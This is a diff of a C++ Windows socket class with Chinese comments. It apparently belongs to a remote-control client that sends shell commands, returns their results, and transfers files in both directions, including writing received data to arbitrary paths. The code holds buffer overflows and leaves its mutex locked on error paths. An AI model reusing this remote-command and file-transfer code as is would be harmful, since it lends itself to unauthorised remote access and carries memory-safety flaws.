@@ -137,7 +137,7 @@ bool MySocket::Recv() {
 
 	//char RecvData[BUFSIZ];
 	char* RecvData = new char[CMDSIZE];
-	memset(RecvData, 0, CMDSIZE);
+	ZeroMemory(RecvData, CMDSIZE);
 	while (true) {
 		// 接收数据
 		WaitForSingleObject(this->mutex, INFINITE);
@@ -164,7 +164,7 @@ bool MySocket::MyRecvHeartBeat() {
 }
 
 bool MySocket::SendCmd(wchar_t* shell, char* byteData) {
-	memset(byteData, 0, CMDSIZE);
+	ZeroMemory(byteData, CMDSIZE);
 	// 将wchar_t转换为字节流后发送给服务端
 	int ret = 0;
 	size_t dataLen = wcslen(shell);
@@ -190,7 +190,7 @@ bool MySocket::SendCommand(UINT32 command) {
 	// UINT32强转为const char*
 	//const char* data = reinterpret_cast<const char*>(&command);
 	char* data = new char[sizeof(UINT32)];
-	memset(data, 0, sizeof(UINT32));
+	ZeroMemory(data, sizeof(UINT32));
 	itoa(command, data, 10);
 	WaitForSingleObject(this->mutex, INFINITE);
 	int ret = send(this->sClient, data, strlen(data), 0);
@@ -205,8 +205,7 @@ bool MySocket::SendCommand(UINT32 command) {
 }
 
 bool MySocket::RecvCmd(wchar_t* result, char* resbuf) {
-
-	memset(resbuf, 0, CMDSIZE);
+	ZeroMemory(resbuf, CMDSIZE);
 	int ret = 0;
 	WaitForSingleObject(this->mutex, INFINITE);
 	ret = recv(this->sClient, resbuf, CMDSIZE, 0);
@@ -230,7 +229,7 @@ bool MySocket::Send(wchar_t* Command) {
 
 	size_t len = wcslen(Command);
 	char* buf = new char[len * sizeof(wchar_t)];
-	memset(buf, 0, len * sizeof(wchar_t));
+	ZeroMemory(buf, len * sizeof(wchar_t));
 	int bufferSize = WideCharToMultiByte(CP_ACP, 0, Command, len, NULL, 0, NULL, NULL);
 	size_t byteLen = sizeof(wchar_t) * len;
 	WideCharToMultiByte(CP_ACP, 0, Command, byteLen, buf, bufferSize, NULL, NULL);
@@ -264,7 +263,7 @@ bool MySocket::ReadFromFile(wchar_t* Path, UINT32* len, char** FileBuf) {
 	//wprintf(L"File size is 0x%X\n", dwFileSize);
 
 	*FileBuf = new char[dwFileSize + 1]; // 添加一个额外的字节用于存储字符串结束符
-	memset(*FileBuf, 0, dwFileSize + 1);
+	ZeroMemory(*FileBuf, dwFileSize + 1);
 
 	if (!ReadFile(hFile, *FileBuf, dwFileSize, &dwBytesRead, NULL)) {
 		//wprintf(L"ReadFile error %d\n", GetLastError());
@@ -288,5 +287,81 @@ bool MySocket::SendFile(char* File, int len) {
 
 	ReleaseMutex(this->mutex);
 
+	return true;
+}
+
+bool MySocket::RecvFile(char* File, int len) {
+	WaitForSingleObject(this->mutex, INFINITE);
+	int ret = recv(this->sClient, File, len, 0);
+	if (ret <= 0) {
+		return false;
+	}
+	ReleaseMutex(this->mutex);
+	File[ret] = '\0';
+	return true;
+}
+
+
+bool MySocket::WriteToFile(char* FileBuf, wchar_t* path) {
+	// 先对FileBuf文件进行编码转换
+	int wideCharSize = MultiByteToWideChar(CP_ACP, 0, FileBuf, -1, NULL, 0);
+
+	// 分配宽字符字符串的缓冲区
+	wchar_t* wideCharStr = new wchar_t[wideCharSize + 1];
+	ZeroMemory(wideCharStr, (wideCharSize + 1) * sizeof(wchar_t));
+
+	// 转换为宽字符字符串
+	MultiByteToWideChar(CP_ACP, 0, FileBuf, -1, wideCharStr, wideCharSize);
+
+	// 然后将wideCharStr转换为ANSI编码的多字节字符串
+	int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, NULL, 0, NULL, NULL);
+	char* ansiBuffer = new char[bufferSize + 1];
+	ZeroMemory(ansiBuffer, bufferSize + 1);
+	WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, ansiBuffer, bufferSize, NULL, NULL);
+
+	// 然后将ansiBuffer写入文件
+	// wchar_t Path[] = L"D:\\test.txt";
+	HANDLE hFile = CreateFileW(
+		path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+	);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		wprintf(L"CreateFile Error %d\n", GetLastError());
+		delete[] wideCharStr;
+		delete[] ansiBuffer;
+		return false;
+	}
+
+	DWORD dwBytesWritten;
+	if (!WriteFile(hFile, ansiBuffer, strlen(ansiBuffer), &dwBytesWritten, NULL)) {
+		wprintf(L"Write File error %d\n", GetLastError());
+		CloseHandle(hFile);
+		delete[] wideCharStr;
+		delete[] ansiBuffer;
+		return false;
+	}
+
+	CloseHandle(hFile);
+	delete[] wideCharStr;
+	delete[] ansiBuffer;
+
+	return true;
+}
+
+
+bool MySocket::RecvIns(UINT32* command) {
+	char* buf = new char[sizeof(UINT32)];
+	ZeroMemory(buf, sizeof(UINT32));
+	// 接收比特流
+	int ret = 0;
+	WaitForSingleObject(this->mutex, INFINITE);
+	if ((ret = recv(this->sClient, buf, sizeof(UINT32), 0)) <= 0) {
+		wprintf(L"Recv cmd error %d\n", WSAGetLastError());
+		return false;
+	}
+	//*command = *reinterpret_cast<const UINT32*>(buf);
+	*command = atoi(buf);
+	delete[] buf;
+	ReleaseMutex(this->mutex);
 	return true;
 }
